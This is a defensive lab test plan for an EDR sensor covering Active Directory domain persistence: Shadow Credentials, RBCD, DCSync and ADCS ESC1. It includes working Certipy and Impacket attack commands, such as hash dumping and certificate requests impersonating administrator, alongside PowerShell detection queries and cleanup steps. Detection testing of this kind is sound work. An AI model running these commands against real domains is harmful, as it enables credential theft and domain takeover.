# Test: AD domain persistence — Shadow Credentials / RBCD / DCSync / ADCS (domain lab)

**The technique (research):** when the CCDC environment includes Active Directory, real
actors stop persisting on hosts and persist **in the domain** — surviving host rebuilds
and credential resets:

- **Shadow Credentials** — write an attacker key into a victim's `msDS-KeyCredentialLink`
  and authenticate *as them* via certificate PKINIT forever ([Elad Shamir's original
  research](https://eladshamir.com/2021/06/21/Shadow-Credentials.html)). Detection:
  **event 5136** on that attribute ([Elastic prebuilt rule](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/credential_access_shadow_credentials)).
- **RBCD abuse** — set `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer,
  then S4U into any user on it. Detection: **5136** on that attribute + **4769** S4U
  TGS requests ([SwolfSec detection walkthrough](https://swolfsec.github.io/2023-11-29-Detecting-Resource-Based-Constrained-Delegation/)).
- **DCSync** — invoke directory replication to dump every credential hash, from any
  machine, without touching LSASS. Detection: **4662** with replication extended-right
  GUIDs (`1131f6aa-…`, `1131f6ad-…`, `89e95b76-…`) from a **non-DC account**
  ([Black Lantern Security](https://blog.blacklanternsecurity.com/p/detecting-dcsync),
  [Elastic correlation rule](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/credential_access_dcsync_replication_rights)).
- **ADCS certificate abuse** — ESC1 misconfigured templates let anyone enroll as Domain
  Admin; "golden certificates" persist through full credential resets
  ([Unit 42 AD CS analysis](https://origin-unit42.paloaltonetworks.com/active-directory-certificate-services-exploitation/),
  [Certipy tool](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6)).

**Prerequisite:** domain-joined lab with a DC. Not testable on a workgroup server —
that's finding #1.

## Manual test (attack box with Certipy/Rubeus/Impacket, domain creds)

```bash
# --- Shadow Credentials (Certipy) ---
certipy shadow auto -account victim-svc$ -dc-ip <DC_IP> -u attacker@dom.local -p 'Pass'

# --- RBCD ---
certipy rd -dc-ip <DC_IP> -t victim-computer$ -u attacker@dom.local -p 'Pass' # write delegation
# then S4U via Rubeus/Impacket getST -impersonate administrator -spn cifs/victim.dom.local

# --- DCSync (Impacket) ---
secretsdump.py 'dom.local/attacker:Pass@<DC_IP>' -just-dc-ntlm

# --- ADCS ESC1 hunt + abuse ---
certipy find -u attacker@dom.local -p 'Pass' -dc-ip <DC_IP> -vulnerable
certipy req -u attacker@dom.local -p 'Pass' -ca CORP-CA -template VULN-TEMPLATE -upn administrator@dom.local
```

**Detection verification (on the DC, or wherever logs centralize):**

```powershell
# 5136 - shadow credentials / RBCD attribute writes:
Get-WinEvent -FilterHashtable @{LogName='Security';Id=5136} -MaxEvents 100 |
  Where-Object { $_.Message -match 'msDS-KeyCredentialLink|AllowedToActOnBehalfOfOtherIdentity' }
# 4662 - DCSync replication from a non-DC:
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4662} -MaxEvents 200 |
  Where-Object { $_.Message -match '1131f6aa|1131f6ad|89e95b76' -and $_.Message -notmatch '\$$' }
# 4769 - S4U (RBCD second half):
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} -MaxEvents 200 |
  Where-Object { $_.Message -match 'S4U2Proxy|0x40810010' }
```

**Expected vs gap (your EDR):** all three channels (**5136 / 4662 / 4769**) are
**unconsumed** — the entire domain-persistence category is invisible to your sensor
today. Implementation notes (channel filters, GUID match, non-DC account exclusion) are
in `../../development-research/future-detections-research.md`.

**Cleanup (domain):** remove the written attributes (`certipy shadow clear`,
`certipy rd -clear`), revoke issued certs, reset any abused credentials.
